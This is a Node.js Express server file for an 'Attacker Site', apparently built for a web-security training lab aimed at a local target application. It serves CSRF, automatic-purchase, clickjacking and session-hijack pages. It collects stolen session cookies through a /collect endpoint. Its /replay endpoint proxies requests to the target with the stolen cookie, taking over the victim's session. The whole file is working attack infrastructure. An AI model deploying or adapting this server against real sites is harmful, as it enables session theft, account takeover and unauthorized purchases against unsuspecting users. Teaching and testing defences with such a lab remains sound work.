const fs = require("fs");
const path = require("path");
const http = require("http");
const https = require("https");
const express = require("express");
const morgan = require("morgan");

const DEFAULT_PORT = Number(process.env.PORT || 5000);
const DEFAULT_TARGET_BASE = process.env.TARGET_BASE || "http://localhost:4000";

function renderPage(filename, pageData) {
  const body = fs.readFileSync(path.join(__dirname, "public", filename), "utf8");
  return `<!doctype html>
<html lang="ja">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Attacker Site</title>
  </head>
  <body>
    <script>
      window.__TARGET_BASE__ = ${JSON.stringify(pageData.targetBase)};
      window.__LAST_STOLEN_COOKIE__ = ${JSON.stringify(pageData.lastStolenCookie)};
      window.__CLICKJACKING_TARGET__ = ${JSON.stringify(pageData.clickjackingTarget)};
    </script>
    ${body}
  </body>
</html>`;
}

function createApp(options) {
  const config = Object.assign(
    {
      targetBase: DEFAULT_TARGET_BASE,
      logger: morgan("dev"),
      state: { lastStolenCookie: "" }
    },
    options || {}
  );

  const app = express();
  if (config.logger) {
    app.use(config.logger);
  }

  function render(filename) {
    return renderPage(filename, {
      targetBase: config.targetBase,
      lastStolenCookie: config.state.lastStolenCookie || "",
      clickjackingTarget: new URL("/purchase/1", config.targetBase).toString()
    });
  }

  function normalizeReplayPath(inputPath) {
    const replayPath = String(inputPath || "/orders");
    if (replayPath.charAt(0) !== "/") {
      return null;
    }
    return replayPath;
  }

  function proxyWithStolenCookie(replayPath, callback) {
    const targetUrl = new URL(config.targetBase);
    const transport = targetUrl.protocol === "https:" ? https : http;
    const requestOptions = {
      protocol: targetUrl.protocol,
      hostname: targetUrl.hostname,
      port: targetUrl.port || (targetUrl.protocol === "https:" ? 443 : 80),
      path: replayPath,
      method: "GET",
      headers: {
        cookie: config.state.lastStolenCookie
      }
    };

    const req = transport.request(requestOptions, callback);
    req.on("error", callback);
    req.end();
  }

  app.get("/csrf", (req, res) => {
    res.setHeader("content-type", "text/html; charset=utf-8");
    res.send(render("csrf.html"));
  });

  app.get("/", (req, res) => {
    res.setHeader("content-type", "text/html; charset=utf-8");
    res.send(render("index.html"));
  });

  app.get("/auto-purchase", (req, res) => {
    res.setHeader("content-type", "text/html; charset=utf-8");
    res.send(render("auto_purchase.html"));
  });

  app.get("/clickjacking", (req, res) => {
    res.setHeader("content-type", "text/html; charset=utf-8");
    res.send(render("clickjacking.html"));
  });

  app.get("/collect", (req, res) => {
    config.state.lastStolenCookie = String(req.query.cookie || "");
    res.status(204).end();
  });

  app.get("/session-hijack", (req, res) => {
    res.setHeader("content-type", "text/html; charset=utf-8");
    res.send(render("session_hijack.html"));
  });

  app.get("/replay", (req, res) => {
    const replayPath = normalizeReplayPath(req.query.path);
    if (!config.state.lastStolenCookie) {
      return res.status(400).send("No stolen cookie collected yet");
    }
    if (!replayPath) {
      return res.status(400).send("Invalid replay path");
    }

    proxyWithStolenCookie(replayPath, (upstream) => {
      if (upstream instanceof Error) {
        if (!res.headersSent) {
          res.status(502).send("Replay failed");
        }
        return;
      }

      res.status(upstream.statusCode || 200);
      if (upstream.headers["content-type"]) {
        res.setHeader("content-type", upstream.headers["content-type"]);
      }
      upstream.pipe(res);
    });
  });

  app.locals.config = config;
  return app;
}

function startServer(options) {
  const config = Object.assign({ port: DEFAULT_PORT, host: undefined }, options || {});
  const app = createApp(config);
  const server = app.listen(config.port, config.host, () => {
    // eslint-disable-next-line no-console
    console.log(`[attacker] listening on http://localhost:${server.address().port}`);
    // eslint-disable-next-line no-console
    console.log(`[attacker] TARGET_BASE=${config.targetBase || DEFAULT_TARGET_BASE}`);
  });
  return { app: app, server: server };
}

if (require.main === module) {
  startServer();
}

module.exports = {
  createApp: createApp,
  startServer: startServer
};
